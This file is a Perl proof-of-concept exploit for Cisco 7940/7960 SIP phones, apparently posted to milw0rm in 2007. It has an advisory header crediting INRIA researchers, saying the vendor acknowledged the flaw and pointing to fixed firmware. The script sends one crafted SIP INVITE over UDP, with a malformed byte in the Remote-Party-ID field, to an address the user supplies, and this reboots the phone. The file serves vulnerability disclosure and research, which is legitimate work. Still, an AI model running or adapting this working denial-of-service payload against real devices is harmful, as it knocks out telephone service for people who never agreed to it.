@@ -1,0 +1,66 @@
+#!/usr/bin/perl
+# Title: Cisco 7940 SIP INVITE remote DOS 
+# Date: February 19, 2007 
+# ID: KIPH2 
+#
+# Synopsis: After sending a cra fted INVITE message the device immediately 
+# reboots. The phone does not check properly the sipURI field of the 
+# Remote-Party-ID in the message. 
+#
+# The vendor was informed and acknowledged the vulnerability. This 
+# vulnerability was identified by the Madynes research team at INRIA 
+# Lorraine, using the Madynes VoIP fuzzer. 
+#
+# Background: SIP is the IETF standardized (RFCs 2543 and 3261) protocol 
+# for VoIP signalization. SIP is an ASCII based INVITE message is used to 
+# initiate and maintain a communication session. 
+#
+# Affected devices: Cisco phone 7940/7960 running firmware P0S3-07-4-00 
+#
+# Unaffected: devices running firmware POS8-6-0 
+#
+# Description: After receiving one crafted SIP INVITE message, the 
+# affected device reboots immediately. The proof of concept code can be 
+# used to demonstrate the vulnerability. 
+#
+# Resolution: 
+#
+# Fixed software is available from the vendor and customers following 
+# recommended best practices (ie segregating VOIP traffic from data) will 
+# be protected from malicious traffic in most situations. 
+#
+# Credits: 
+#
+# Humberto J. Abdelnur (Ph.D Student) 
+#
+# Radu State (Ph.D) 
+#
+# Olivier Festor (Ph.D) 
+#
+# This vulnerability was identified by the Madynes research team at INRIA 
+#
+# Lorraine, using the Madynes VoIP fuzzer. 
+#
+# http://madynes.loria.fr/ 
+
+use IO::Socket::INET;
+
+die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);
+
+
+$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],
+
+Proto=>'udp',
+
+PeerAddr=>$ARGV[0]);
+
+
+$msg="INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP
+192.168.1.2;branch=z9hG4jk\r\nFrom: sip:chirimolla
+\@192.168.1.2;tag=qwzng\r\nTo: <sip:$ARGV[2]\@$ARGV[0];user=ip>\r
+\nCall-ID: fosforito\@192.168.1.1\r\nCSeq: 921 INVITE\r
+\nRemote-Party-ID: csip:7940-1\@192.168.\xd1.7\r\n\r\n";
+
+$socket->send($msg);
+
+# milw0rm.com [2007-03-20]
